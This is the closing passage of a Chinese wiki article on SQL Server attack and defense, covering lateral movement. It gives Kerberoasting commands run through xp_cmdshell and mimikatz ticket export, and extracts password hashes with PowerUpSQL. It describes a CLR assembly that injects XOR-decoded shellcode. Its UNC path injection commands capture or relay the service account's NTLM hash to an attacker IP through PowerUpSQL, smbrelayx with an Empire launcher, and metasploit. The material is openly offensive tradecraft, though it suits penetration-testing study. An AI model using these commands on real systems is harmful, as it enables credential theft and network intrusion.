<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel </span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/MSSQL2.sec.com:1433&quot;</span><br><span class="line">exec xp_cmdshell &#x27;powershell Add-Type -AssemblyName System.IdentityModel ; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/MSSQL2.sec.com:1433&quot;&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-3.png"></p>
<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-4.png"></p>
<p>之后可以使用PowerShell命令远程下载部署<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>，或者<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/nidem/kerberoast">kerberoast</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#mimikatz：kerberos::list /export</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-5.png"></p>
<p>导出的票据会保存到当前目录的kirbi文件。</p>
<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-6.png"></p>
<p>利用<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/nidem/kerberoast">kerberoast</a>中的tgsrepcrack.py脚本，离线破解NTLM Hash。</p>
<p>PowerUpSQL中使用Get-SQLServerPasswordHash，可自动提取SQL登录密码哈希：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLServerPasswordHash -Verbose -Instance &#x27;SQLServerName\InstanceName&#x27; -Migrate</span><br></pre></td></tr></table></figure>

<h4 id="CLR实现无文件落地横向移动"><a href="#CLR实现无文件落地横向移动" class="headerlink" title="CLR实现无文件落地横向移动"></a>CLR实现无文件落地横向移动</h4><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://research.nccgroup.com/author/dcashncc/">David Cash</a>在<a target="_blank" rel="external nofollow noopener noreferrer" href="https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/">MSSQL Lateral Movement</a>介绍了SQL Server中使用CLR自动执行横向移动而无文件落地和不需要xp_cmdshell，以及如何防止被检测到。</p>
<p>CLR相关的介绍在上文已经介绍，在此不再赘述。通常为实现命令执行而对MSSQL服务进行后期开发通常会利用XP_CMDSHELL存储过程在MSSQL进程的上下文中运行操作系统命令。要使用此技术运行自定义代码，通常需要使用LOLBINS，添加新的操作系统用户或通过BCP写入磁盘的二进制文件，这提供了明显的检测机会。</p>
<p>SQL Server服务进程可以执行提供给它的任何.NET代码，因此利用.NET代码进行横向移动，仅需要构建适当的DLL。作为概念的证明，为了生成了一个简单的程序集，该程序集对一些shellcode进行XOR并将其注入到生成的进程中。使用<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak">Squeak</a>可以简化CLR代码的创建和调用，下面是Squeak具备的一些功能：</p>
<ul>
<li><p>展示连接数据</p>
</li>
<li><p>从原始二进制文件和单字节XOR读取shellcode字节</p>
</li>
<li><p>生成一个MSSQL CLR DLL，该DLL对shellcode进行XOR，生成一个新进程，然后将shellcode注入其中。</p>
</li>
<li><p>计算DLL的SHA512哈希</p>
</li>
<li><p>生成带有硬编码参数的单个.NET可执行文件，以通过SQL连接执行DLL –该可执行文件执行以下操作：</p>
<ul>
<li><p>创建一个SQL连接</p>
</li>
<li><p>检查SQL Server版本</p>
</li>
<li><p>检查DBA权限</p>
</li>
<li><p>检查并记录现有的安全设置</p>
</li>
<li><p>修改安全设置</p>
</li>
<li><p>创建并运行程序集</p>
</li>
<li><p>恢复安全设置并删除程序集</p>
</li>
</ul>
</li>
</ul>
<p>使用<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak">Squeak</a>可以生成带有连接字符串和CLR程序集的独立可执行文件。CLR程序集的代码是从本地目录中的文件中加载，可以直接打开文件，也可以在工具中对其进行编辑。 </p>
<h4 id="UNC路径注入"><a href="#UNC路径注入" class="headerlink" title="UNC路径注入"></a>UNC路径注入</h4><p>UNC用于访问远程文件服务器，格式为\ip\file，如果我们可以执行这个功能，则可以强制SQL Server向我们进行身份验证，并且可以获得SQL Server服务帐号的NTLM密码哈希。</p>
<p>可以通过以下方式实现自动化：</p>
<ul>
<li>PowerUpSQL的Get-SQLServiceAccountPwHashes脚本</li>
<li>SQL NTLM Hash：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUpSQL.ps1`</span><br><span class="line">Import-Module C:\PowerUpSQL-master\Scripts\3rdparty\Inveigh.ps1</span><br><span class="line">Import-Module C:\PowerUpSQL-master\Scripts\pending\Get-SQLServiceAccountPwHashes.ps1</span><br><span class="line">Get-SQLServiceAccountPwHashes -Verbose -TimeOut 20 -CaptureIp attacker_controlled_ip</span><br></pre></td></tr></table></figure>

<ul>
<li>使用smbrelayx（impacket）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h sqlserverIP -c &#x27;powershell empire launcher&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>metasploit的SQL NTLM Hash：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/admin/mssql/mssql_ntlm_stealer</span><br><span class="line">set SMBPROXY attackerIP</span><br><span class="line">set RHOST webappwithsqliIP</span><br><span class="line">set GET_PATH pathtosqli</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm">https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.freetds.org/">http://www.freetds.org/</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html">http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/">https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/7534">https://xz.aliyun.com/t/7534</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a></li>
</ul>
</blockquote>

            </div>
        
        <footer class="article-footer">
        </footer>
    </div>
</article>


    
<nav id="article-nav">
    
        <a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/" id="article-nav-newer" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Newer</strong>
            <div class="article-nav-title">
                
                    SQL Server数据库安全加固
                
            </div>
        </a>
    
    
        <a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/" id="article-nav-older" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Older</strong>
            <div class="article-nav-title">SQL Server数据库攻防详解上篇</div>
        </a>
    
</nav>





    
    




<!-- baidu url auto push script -->
<script type="text/javascript">
    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
</script>     
</section>
        </div>
        <footer id="footer">
    <div class="outer">
        <div id="footer-info" class="inner">
            Tahir &copy; 2021 
            <a rel="external nofollow noopener noreferrer" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png"></a>
            <br> Powered by <a href="http://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme - <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
            
                <br>
                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
                &nbsp;|&nbsp;
                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
            
        </div>
    </div>
</footer>

        

    
        
<script src="/libs/lightgallery/js/lightgallery.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-pager.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-hash.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-share.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-video.min.js"></script>

    
    
        
<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>

    
    
        <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true,
            TeX: {
                equationNumbers: {
                  autoNumber: 'AMS'
                }
            }
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    



<!-- Custom Scripts -->

<script src="/js/main.js"></script>


    </div>
</body>
</html>